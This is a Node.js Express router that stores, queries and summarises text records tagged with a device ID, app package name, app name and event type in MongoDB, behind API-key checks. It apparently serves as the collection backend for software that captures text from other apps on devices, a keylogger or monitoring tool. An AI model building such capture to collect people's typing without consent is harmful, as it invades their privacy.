const express = require('express');
const router = express.Router();
const TextInput = require('../models/TextInput');
const { authenticateApiKey } = require('../middleware/auth');

// POST /api/text-inputs - Save text input
router.post('/', authenticateApiKey, async (req, res) => {
    try {
        const {
            id,
            timestamp,
            packageName,
            appName,
            text,
            eventType,
            deviceId
        } = req.body;

        // Validate required fields
        if (!id || !packageName || !appName || !text || !eventType || !deviceId) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields: id, packageName, appName, text, eventType, deviceId'
            });
        }

        // Create text input data
        const textInputData = {
            id,
            timestamp: timestamp ? new Date(timestamp) : new Date(),
            packageName,
            appName,
            text,
            eventType,
            deviceId
        };

        // Save to MongoDB
        const textInput = new TextInput(textInputData);
        await textInput.save();

        res.status(201).json({
            success: true,
            message: 'Text input saved successfully',
            data: {
                id: textInput.id,
                timestamp: textInput.timestamp,
                packageName: textInput.packageName,
                appName: textInput.appName,
                eventType: textInput.eventType
            }
        });

    } catch (error) {
        console.error('Error saving text input:', error);
        
        if (error.code === 11000) {
            // Duplicate key error
            res.status(409).json({
                success: false,
                message: 'Text input with this ID already exists',
                duplicate: true
            });
        } else {
            res.status(500).json({
                success: false,
                message: 'Internal server error',
                error: process.env.NODE_ENV === 'development' ? error.message : 'Something went wrong'
            });
        }
    }
});

// GET /api/text-inputs - Fetch text inputs
router.get('/', authenticateApiKey, async (req, res) => {
    try {
        const {
            deviceId,
            packageName,
            limit = 100,
            offset = 0,
            startDate,
            endDate,
            eventType
        } = req.query;

        // Build query
        const query = {};
        
        if (deviceId) {
            query.deviceId = deviceId;
        }
        
        if (packageName) {
            query.packageName = packageName;
        }
        
        if (eventType) {
            query.eventType = eventType;
        }
        
        if (startDate || endDate) {
            query.timestamp = {};
            if (startDate) query.timestamp.$gte = new Date(startDate);
            if (endDate) query.timestamp.$lte = new Date(endDate);
        }

        // Execute query
        const textInputs = await TextInput.find(query)
            .sort({ timestamp: -1 })
            .limit(parseInt(limit))
            .skip(parseInt(offset))
            .select('-__v');

        // Get total count for pagination
        const totalCount = await TextInput.countDocuments(query);

        res.json({
            success: true,
            data: textInputs,
            pagination: {
                total: totalCount,
                limit: parseInt(limit),
                offset: parseInt(offset),
                hasMore: (parseInt(offset) + textInputs.length) < totalCount
            }
        });

    } catch (error) {
        console.error('Error fetching text inputs:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: process.env.NODE_ENV === 'development' ? error.message : 'Something went wrong'
        });
    }
});

// GET /api/text-inputs/stats - Get text input statistics
router.get('/stats', authenticateApiKey, async (req, res) => {
    try {
        const { deviceId, packageName } = req.query;

        const matchQuery = {};
        if (deviceId) matchQuery.deviceId = deviceId;
        if (packageName) matchQuery.packageName = packageName;

        const stats = await TextInput.aggregate([
            { $match: matchQuery },
            {
                $group: {
                    _id: null,
                    totalTextInputs: { $sum: 1 },
                    uniqueApps: { $addToSet: '$packageName' },
                    uniqueDevices: { $addToSet: '$deviceId' },
                    eventTypes: { $addToSet: '$eventType' }
                }
            },
            {
                $project: {
                    totalTextInputs: 1,
                    uniqueAppsCount: { $size: '$uniqueApps' },
                    uniqueDevicesCount: { $size: '$uniqueDevices' },
                    uniqueApps: 1,
                    uniqueDevices: 1,
                    eventTypes: 1
                }
            }
        ]);

        const result = stats.length > 0 ? stats[0] : {
            totalTextInputs: 0,
            uniqueAppsCount: 0,
            uniqueDevicesCount: 0,
            uniqueApps: [],
            uniqueDevices: [],
            eventTypes: []
        };

        res.json({
            success: true,
            data: result
        });

    } catch (error) {
        console.error('Error fetching text input stats:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: process.env.NODE_ENV === 'development' ? error.message : 'Something went wrong'
        });
    }
});

module.exports = router;
